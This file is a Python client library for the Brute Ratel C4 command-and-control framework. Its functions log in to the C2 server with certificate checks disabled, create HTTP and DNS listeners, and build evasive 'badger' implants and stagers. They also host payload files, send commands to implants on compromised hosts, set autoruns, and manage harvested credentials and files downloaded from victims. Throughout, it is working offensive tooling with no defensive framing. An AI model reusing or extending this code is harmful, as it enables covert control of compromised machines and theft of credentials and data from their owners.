import requests
import json
import urllib3
import ssl
import sys
import websockets
import traceback
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

## VERSION 0.1
## RELEASED WITH BRC4 2.2 - Rinnegan

B_FAILED   = 0
B_SUCCESS  = 1
B_CONTINUE = 2

g_BADGER_OUTPUT_NAME = ""
g_STAGER_OUTPUT_NAME = ""
g_OPERATOR_USERNAME = ""
g_OPERATOR_TOKEN = ""
g_HANDLER = ""

# 0 = failure, 1 = success, 2 = continue searching
def _validate_response(taskId, jdata):
    if 'task' not in jdata:
        return B_FAILED
    if 'access' not in jdata:
        return B_FAILED
    if 'status' not in jdata:
        return B_FAILED
    if jdata['access'] == False:
        return B_FAILED
    if jdata['task'] != taskId:
        return B_CONTINUE

    return jdata['status']

def _printError(errorString):
    print("[brc4:error]", errorString)

def _printInfo(infoString):
    print("[brc4:info]", infoString)

def br_login(username, password, server):
    json_config = {
        'creds': {
            'user': username,
            'pass': password,
        }
    }
    http_server = 'https://'+server+'/'
    try:
        response = requests.post(http_server, data=json.dumps(json_config), verify=False)
        jsonResponse = json.loads(response.text)
        if 'token' in jsonResponse:
            return jsonResponse['token']
        else:
            _printError("response does not contain token")
    except Exception as ex:
        _printError(ex)
    return ""

async def br_authenticate(username, token, server):
    json_config = {
        'creds': {
            'user': username,
            'token': token,
        },
        'task':0
    }
    api_server = "wss://" + server
    global g_HANDLER
    g_HANDLER = api_server
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    try:
        ratelSocket = await websockets.connect(api_server, ssl=ssl_context)
        await ratelSocket.send(json.dumps(json_config))
        response = await ratelSocket.recv()
        jdata = json.loads(response)
        retVal = _validate_response(0, jdata)
        if retVal == B_FAILED:
            _printError("you were logged out")
            return None
        elif retVal == B_SUCCESS:
            global g_OPERATOR_USERNAME
            g_OPERATOR_USERNAME = username
            global g_OPERATOR_TOKEN
            g_OPERATOR_TOKEN = token
            return ratelSocket
        elif retVal == B_CONTINUE:
            return None
    except Exception as ex:
        _printError(ex)

async def br_connect_handler(username, password, server):
    token = br_login(username, password, server)
    if token == "":
        _printError("invalid username, password or server")
        sys.exit(0)
    wsClient = await br_authenticate(username, token, server)
    if wsClient is None:
        _printError("token authentication error")
        sys.exit(0)
    return wsClient

async def br_list_listeners(ratelSocket):
    json_config = {
        "task": 8,
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    listenerlist = []
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(8, jdata)
            if retVal == B_FAILED:
                return listenerlist
            elif retVal == B_SUCCESS:
                if (len(jdata["listeners"]) > 0):
                    for x, _ in jdata["listeners"].items():
                        listenerlist.append(x)
                return listenerlist
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return listenerlist

async def br_stop_listener(ratelSocket, listenerName):
    json_config = {
        "task": 7,
        "listener": listenerName
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(7, jdata)
            if retVal == B_FAILED:
                return False
            elif retVal == B_SUCCESS:
                return True
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return False

async def br_add_listener(ratelSocket, config_file, listener_type):
    with open(config_file, 'r', encoding='utf-8') as f:
        listener_config = json.load(f)

    listenerName = listener_config["listener_name"]
    if listenerName == "":
        _printError("cannot find listener name")
        return False
    json_config = {
        "listener": listener_config
    }
    if listener_type == "http":
        json_config["task"] = 6
    elif listener_type == "dns":
        json_config["task"] = 48
    else:
        _printError("invalid listener config")
        return False

    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(24, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                if 'listeners' in jdata:
                    for x, _ in jdata["listeners"].items():
                        if x == listenerName:
                            return True
            elif retVal == B_CONTINUE:
                continue

        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return False

async def verify_badger_args(b_arch, b_evasion_type, b_sub_type, b_exit_method):
    if b_arch == "x86" or b_arch == "x64":
        pass
    else:
        return False

    if b_evasion_type == "etw" or b_evasion_type == "stealth":
        pass
    else:
        return False

    if b_sub_type == "full" or b_sub_type == "min-bin" or b_sub_type == "net-bin":
        pass
    else:
        return False

    if b_exit_method == "rtl" or b_exit_method == "wait":
        pass
    else:
        return False
    return True

async def br_build_badger(ratelSocket, config_name, b_arch, b_evasion_type, b_sub_type, b_exit_method):
    json_config = {
        "task": 36,
        "svc_name": 'NA',
        "svc_desc": 'NA',
        "payload_config_name": config_name,
    }
    if await verify_badger_args(b_arch, b_evasion_type, b_sub_type, b_exit_method):
        if b_arch == "x86":
            json_config['payload_arch'] = 0
            if b_exit_method == "rtl":
                if b_sub_type == "full":
                    json_config['payload_type'] = 1
                elif b_sub_type == "min-bin":
                    json_config['payload_type'] = 11
                elif b_sub_type == "net-bin":
                    json_config['payload_type'] = 15
            elif b_exit_method == "wait":
                if b_sub_type == "full":
                    json_config['payload_type'] = 2
                elif b_sub_type == "min-bin":
                    json_config['payload_type'] = 12
                elif b_sub_type == "net-bin":
                    json_config['payload_type'] = 16
        elif b_arch == "x64":
            json_config['payload_arch'] = 1
            if b_evasion_type == 'etw':
                if b_exit_method == "rtl":
                    if b_sub_type == "full":
                        json_config['payload_type'] = 1
                    elif b_sub_type == "min-bin":
                        json_config['payload_type'] = 11
                    elif b_sub_type == "net-bin":
                        json_config['payload_type'] = 15
                elif b_exit_method == "wait":
                    if b_sub_type == "full":
                        json_config['payload_type'] = 2
                    elif b_sub_type == "min-bin":
                        json_config['payload_type'] = 12
                    elif b_sub_type == "net-bin":
                        json_config['payload_type'] = 16

            elif b_evasion_type == 'stealth':
                if b_exit_method == "rtl":
                    if b_sub_type == "full":
                        json_config['payload_type'] = 8
                    elif b_sub_type == "min-bin":
                        json_config['payload_type'] = 13
                    elif b_sub_type == "net-bin":
                        json_config['payload_type'] = 17
                elif b_exit_method == "wait":
                    if b_sub_type == "full":
                        json_config['payload_type'] = 9
                    elif b_sub_type == "min-bin":
                        json_config['payload_type'] = 14
                    elif b_sub_type == "net-bin":
                        json_config['payload_type'] = 18

    global g_BADGER_OUTPUT_NAME
    g_BADGER_OUTPUT_NAME = "badger_" + b_arch + "_" + b_evasion_type + "_" + b_sub_type + "_" + b_exit_method + "_" + config_name + ".bin"
    json_config['save_path'] = g_BADGER_OUTPUT_NAME
    _printInfo("arch    : " + b_arch)
    _printInfo("evasion : " + b_evasion_type)
    _printInfo("subtype : " + b_sub_type)
    _printInfo("exit    : " + b_exit_method)
    _printInfo("output  : " + g_BADGER_OUTPUT_NAME)
    await ratelSocket.send(json.dumps(json_config))

    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(36, jdata)
            if retVal == B_FAILED:
                _printError("invalid payload name or configuration")
                return None
            elif retVal == B_SUCCESS:
                return base64.b64decode(jdata['payload_dat'])
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_server_backup(ratelSocket):
    json_config = {
        "task": 22,
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(22, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                del jdata["status"]
                del jdata["task"]
                del jdata["access"]
                del jdata["cmdMap"]
                del jdata["watchlist"]
                return jdata
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_add_badger_profile(ratelSocket, config_file):
    try:
        with open(config_file, 'r', encoding='utf-8') as f:
            payload_config = json.load(f)
    except Exception as ex:
        _printError(ex)
        return None

    for k, v in payload_config.items():
        configName = k
        if "type" not in v:
            _printError("key 'type' not found in the payload config")

    json_config = {
        "task": 30,
        "payload_config": payload_config
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(30, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                for x, _ in jdata["payload_config"].items():
                    if x == configName:
                        return True
                return False
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return False

async def br_list_badger_profile(ratelSocket):
    json_config = {
        "task": 31,
        "edit": False
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(31, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                if 'payload_config' in jdata:
                    return jdata["payload_config"]
                else:
                    return None
            elif retVal == B_CONTINUE:
                continue

        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_delete_badger_profile(ratelSocket, config_name):
    json_config = {
        "task": 32,
        "payload_config": config_name
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(32, jdata)
            if retVal == B_FAILED:
                return False
            elif retVal == B_SUCCESS:
                if 'deleted_config' in jdata and jdata['deleted_config'] == config_name:
                    return True
                else:
                    return False
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return False

async def br_host_file(ratelSocket, listener_name, uri, mime_type, file_path):
    try:
        with open(file_path, 'rb') as f:
            host_file_bufer = f.read()
    except Exception as ex:
        _printError(ex)
        return None

    json_config = {
        "task": 9,
        "listener_uri": {
            "listener_name": listener_name,
            "uri": uri,
            "mime_type": mime_type,
            "buffer": (base64.b64encode(host_file_bufer)).decode('utf-8')
        }
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(9, jdata)
            if retVal == B_FAILED:
                return False
            elif retVal == B_SUCCESS:
                return True
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return False

async def br_list_hosted(ratelSocket):
    json_config = {
        "task": 11,
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(11, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                return jdata['hosted']
            elif retVal == B_CONTINUE:
                continue

        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_stop_hosting(ratelSocket, hosted_uri):
    json_config = {
        "task": 10,
        "hosted": hosted_uri
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(10, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                return True
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return False

async def br_list_cmd_q(ratelSocket):
    json_config = {
        "task": 19
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(19, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                if 'badger_q' in jdata:
                    return jdata['badger_q']
                else:
                    return None
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_clear_cmd_q(ratelSocket, badger_id):
    json_config = {
        "task": 20,
        "badger": badger_id
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(20, jdata)
            if retVal == B_FAILED:
                return False
            elif retVal == B_SUCCESS:
                return True
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return False

async def br_set_bgr_cmd(ratelSocket, badger_id, bgr_cmd):
    json_config = {
        "task": 17,
        "bgr_cmd": {
            "badger": badger_id,
            "cmd": bgr_cmd
        }
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(17, jdata)
            if retVal == B_FAILED:
                return False
            elif retVal == B_SUCCESS:
                return True
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return False

async def br_list_badgers(ratelSocket):
    json_config = {
        "task": 16,
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(16, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                if 'badgers' in jdata:
                    return jdata['badgers']
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_remove_badgers(ratelSocket, badger_list_str):
    badger_list = badger_list_str.split(",")
    json_config = {
        "task": 59,
        "bgr_list": badger_list
    }

    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(59, jdata)
            if retVal == B_FAILED:
                return False
            elif retVal == B_SUCCESS:
                if 'bgr_list' in jdata:
                    for bgr in badger_list:
                        if bgr not in jdata['bgr_list']:
                            return False
                    return True
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return False

async def br_add_badgers(ratelSocket, config_file):
    try:
        with open(config_file, 'r', encoding='utf-8') as f:
            badger_config = json.load(f)
    except Exception as ex:
        _printError(ex)
        return None

    json_config = {
        "task": 59,
        "add": True,
        "bgr_list": badger_config
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(59, jdata)
            if retVal == B_FAILED:
                return False
            elif retVal == B_SUCCESS:
                return True
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return False

async def br_set_stage(ratelSocket, listener_name, profile_name, stage_count):
    json_config = {
        "task": 41,
        "listener_name": listener_name,
    }
    if stage_count == 0:
        json_config["remove"] = True
    else:
        json_config["profile"] = profile_name
        json_config["stage_count"] = stage_count

    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(41, jdata)
            if retVal == B_FAILED:
                return False
            elif retVal == B_SUCCESS:
                if "listener_name" in jdata:
                    if "remove" in jdata:
                        return True
                    else:
                        return True
                return False
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return False

async def br_build_stage(ratelSocket, listener_name, arch, exit_method):
    json_config = {
        "task": 40,
        "build": True,
        "arch": arch,
        "listener_name": listener_name,
        "ret": exit_method,
    }
    global g_STAGER_OUTPUT_NAME
    g_STAGER_OUTPUT_NAME = "stage_" + arch + "_" + exit_method + "_" + listener_name + ".bin"
    json_config["save_path"] = g_STAGER_OUTPUT_NAME

    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(40, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                if "listener_name" in jdata and "build" in jdata and "stage" in jdata:
                    if jdata["build"] == True:
                        return base64.b64decode(jdata["stage"])
                return None
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_list_creds(ratelSocket):
    json_config = {
        "task": 15,
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(15, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                if 'credentials' in jdata:
                    return jdata['credentials']
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_manage_creds(ratelSocket, creddomain, creduser, credpass, crednote, doAdd):
    credArray = {
        "creduser": creduser,
        "credpass": credpass,
        "creddomain": creddomain,
        "crednote": crednote,
    }
    json_config = {
        "task": 14,
    }
    if doAdd:
        json_config["add_creds"] = credArray
    else:
        json_config["del_creds"] = credArray

    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(14, jdata)
            if retVal == B_FAILED:
                return False
            elif retVal == B_SUCCESS:
                return True
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return False

async def br_list_user_activity(ratelSocket):
    json_config = {
        "task": 37,
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(37, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                if 'user_activity' in jdata:
                    return jdata['user_activity']
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_list_mitre_activity(ratelSocket):
    json_config = {
        "task": 38,
        "path": "",
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(38, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                if 'graphs' in jdata:
                    return jdata['graphs']
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_riot_control(ratelSocket, listener_name, bgr_cmd):
    json_config = {
        "task": 18,
        "blkconfig": {
            "listener": listener_name,
            "cmd": bgr_cmd
        }
    }
    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(18, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                if 'badger_count' in jdata:
                    return jdata['badger_count']
                pass
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_manage_autoruns(ratelSocket, listdata, taskType):
    json_config = {}
    taskId = 0
    if taskType == "add":
        taskId = 33
        json_config["task"] = taskId
        new_cmd_list = listdata.split(",")
        if len(new_cmd_list) == 1:
            json_config["autorun"] = listdata
        elif len(new_cmd_list) > 1:
            json_config["autoruns"] = new_cmd_list
        else:
            return None
    elif taskType == "list":
        taskId = 34
        json_config["task"] = taskId
    elif taskType == "remove":
        taskId = 35
        json_config["task"] = taskId
        json_config["autorun"] = listdata
    else:
        return None

    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(taskId, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                if 'autoruns' in jdata:
                    return jdata['autoruns']
                return None
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_manage_clickscript(ratelSocket, listdata, taskType):
    json_config = {
        "task": 43,
    }
    if taskType == "list":
        json_config["type"] = "get"
    elif taskType == "add":
        try:
            with open(listdata, 'r', encoding='utf-8') as f:
                click_config = json.load(f)
        except Exception as ex:
            _printError(ex)
            return None
        json_config["type"] = "set"
        json_config["click_script"] = click_config["click_script"]
    else:
        return None

    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(43, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                if 'click_script' in jdata:
                    return jdata['click_script']
                if 'type' in jdata and jdata['type'] == "set":
                    return True
                pass
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_list_archive(ratelSocket, taskType):
    json_config = {
        "task": 23,
        "log_view": taskType,
    }

    await ratelSocket.send(json.dumps(json_config))
    attempts = 10
    while True:
        if attempts == 0:
            break
        response = await ratelSocket.recv()
        try:
            jdata = json.loads(response)
            retVal = _validate_response(23, jdata)
            if retVal == B_FAILED:
                return None
            elif retVal == B_SUCCESS:
                if taskType == "logs":
                    if 'info' in jdata and "logs" in jdata['info']:
                        return jdata['info']['logs']
                else:
                    if 'info' in jdata and "downloads" in jdata['info']:
                        return jdata['info']['downloads']
            elif retVal == B_CONTINUE:
                continue
        except Exception as ex:
            _printError(ex)
        attempts = attempts-1
    return None

async def br_download_file(ratelSocket, fileName):
    json_config = {
        "creds": {
            "user": g_OPERATOR_USERNAME,
            "token": g_OPERATOR_TOKEN,
        },
        "task": 55,
        "dwldFile": "downloads/" + fileName,
        "savePath": "./",
    }

    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    try:
        downloadSocket = await websockets.connect(g_HANDLER, ssl=ssl_context)
        await downloadSocket.send(json.dumps(json_config))

        attempts = 10
        while True:
            if attempts == 0:
                break
            response = await downloadSocket.recv()
            jdata = json.loads(response)
            retVal = _validate_response(55, jdata)
            if retVal == B_FAILED:
                _printError("you were logged out")
                await downloadSocket.close(1000)
                return None
            elif retVal == B_SUCCESS:
                if 'filename' in jdata and 'size' in jdata:
                    fSize = jdata['size']
                    fileBuffer = b''
                    while True:
                        try:
                            fileBuffer += await downloadSocket.recv()
                            if str(len(fileBuffer)) == fSize:
                                await downloadSocket.close(1000)
                                return fileBuffer
                        except Exception as ex:
                            _printError(ex)
                            return None
            elif retVal == B_CONTINUE:
                continue
    except Exception as ex:
        _printError(ex)
    await downloadSocket.close(1000)
    return None
